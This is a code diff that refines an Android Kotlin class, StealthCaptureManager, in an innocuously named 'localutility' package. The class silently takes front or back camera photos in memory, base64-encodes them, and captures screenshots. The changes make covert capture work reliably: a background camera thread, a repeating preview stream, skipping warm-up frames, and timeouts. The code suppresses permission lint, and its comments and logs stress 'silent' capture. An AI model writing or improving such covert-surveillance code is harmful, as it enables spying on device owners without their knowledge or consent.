@@ -1,3 +1,4 @@
+
 package com.example.localutility
 
 import android.annotation.SuppressLint
@@ -8,6 +9,7 @@ import android.hardware.camera2.*
 import android.media.ImageReader
 import android.os.Build
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.Looper
 import android.util.Base64
 import android.util.Log
@@ -31,7 +33,8 @@ class StealthCaptureManager(private val context: Context) {
 
     /**
      * Captures a silent photo entirely in RAM.
-     * Selects supported resolution dynamically and uses CONTROL_MODE_AUTO to avoid 3A deadlock.
+     * Selects supported resolution dynamically and uses TEMPLATE_PREVIEW repeating stream
+     * on a dedicated background HandlerThread so camera HAL AE/AF warm-up succeeds without deadlock.
      */
     @SuppressLint("MissingPermission")
     fun captureCamera(isFront: Boolean, onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
@@ -47,21 +50,29 @@ class StealthCaptureManager(private val context: Context) {
             return
         }
 
+        // Dedicated background HandlerThread for Camera2 HAL callbacks
+        val cameraThread = HandlerThread("StealthCameraThread").apply { start() }
+        val cameraHandler = Handler(cameraThread.looper)
+
         var isFinished = false
         var cameraDevice: CameraDevice? = null
+        var captureSession: CameraCaptureSession? = null
         var imageReader: ImageReader? = null
 
         fun finishWith(data: String?, err: String?) {
             if (isFinished) return
             isFinished = true
+            try { captureSession?.stopRepeating() } catch (_: Exception) {}
+            try { captureSession?.close() } catch (_: Exception) {}
             try { imageReader?.close() } catch (_: Exception) {}
             try { cameraDevice?.close() } catch (_: Exception) {}
+            try { cameraThread.quitSafely() } catch (_: Exception) {}
             mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
-            onComplete(data, err)
+            mainHandler.post { onComplete(data, err) }
         }
 
-        // 7-second safety timeout
-        mainHandler.postDelayed({
+        // 7-second safety timeout so camera is never left open
+        cameraHandler.postDelayed({
             finishWith(null, "Camera capture timed out")
         }, CAPTURE_TIMEOUT_MS)
 
@@ -87,33 +98,41 @@ class StealthCaptureManager(private val context: Context) {
                 ?: supportedSizes.minByOrNull { it.width * it.height }
                 ?: Size(640, 480)
 
-            Log.d(TAG, "Selected camera output resolution: ${targetSize.width}x${targetSize.height}")
+            Log.d(TAG, "Selected camera output resolution: ${targetSize.width}x${targetSize.height} for ${if (isFront) "FRONT" else "BACK"}")
 
             val reader = ImageReader.newInstance(targetSize.width, targetSize.height, ImageFormat.JPEG, 2)
             imageReader = reader
 
+            var framesAcquired = 0
+
             reader.setOnImageAvailableListener({ r ->
                 try {
-                    val image = r.acquireLatestImage()
-                    if (image != null) {
-                        val planes = image.planes
-                        if (planes.isNotEmpty()) {
-                            val buffer = planes[0].buffer
-                            val bytes = ByteArray(buffer.remaining())
-                            buffer.get(bytes)
-                            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                            image.close()
-                            finishWith(base64, null)
-                            return@setOnImageAvailableListener
-                        }
+                    val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                    framesAcquired++
+
+                    // Skip frame 0 so auto-exposure has a few milliseconds to warm up; capture frame 2
+                    if (framesAcquired < 2) {
                         image.close()
+                        return@setOnImageAvailableListener
                     }
-                    finishWith(null, "Empty camera image buffer")
+
+                    val planes = image.planes
+                    if (planes.isNotEmpty()) {
+                        val buffer = planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                        image.close()
+                        Log.d(TAG, "Successfully captured silent camera frame (${bytes.size} bytes)")
+                        finishWith(base64, null)
+                        return@setOnImageAvailableListener
+                    }
+                    image.close()
                 } catch (e: Exception) {
                     Log.e(TAG, "Image read error", e)
                     finishWith(null, e.message)
                 }
-            }, mainHandler)
+            }, cameraHandler)
 
             cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
@@ -123,16 +142,19 @@ class StealthCaptureManager(private val context: Context) {
                         @Suppress("DEPRECATION")
                         camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
+                                captureSession = session
                                 try {
-                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                         addTarget(surface)
                                         set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
+                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                     }
-                                    session.capture(requestBuilder.build(), null, mainHandler)
-                                    Log.d(TAG, "One-shot capture request sent to camera HAL")
+                                    session.setRepeatingRequest(requestBuilder.build(), null, cameraHandler)
+                                    Log.d(TAG, "Silent capture repeating stream started on camera HAL")
                                 } catch (e: Exception) {
-                                    Log.e(TAG, "Capture failed", e)
+                                    Log.e(TAG, "Capture repeating request failed", e)
                                     finishWith(null, "Capture failed: ${e.message}")
                                 }
                             }
@@ -140,7 +162,7 @@ class StealthCaptureManager(private val context: Context) {
                             override fun onConfigureFailed(session: CameraCaptureSession) {
                                 finishWith(null, "Camera session configure failed")
                             }
-                        }, mainHandler)
+                        }, cameraHandler)
                     } catch (e: Exception) {
                         Log.e(TAG, "Session creation error", e)
                         finishWith(null, "Session error: ${e.message}")
@@ -156,7 +178,7 @@ class StealthCaptureManager(private val context: Context) {
                     camera.close()
                     finishWith(null, "Camera open error: $error")
                 }
-            }, mainHandler)
+            }, cameraHandler)
 
         } catch (e: Exception) {
             Log.e(TAG, "Camera open exception", e)
@@ -186,7 +208,7 @@ class StealthCaptureManager(private val context: Context) {
                 if (isDone) return
                 isDone = true
                 mainHandler.postDelayed({ isBusy.set(false) }, 1000)
-                onComplete(data, err)
+                mainHandler.post { onComplete(data, err) }
             }
 
             // 6-second timeout for screenshot
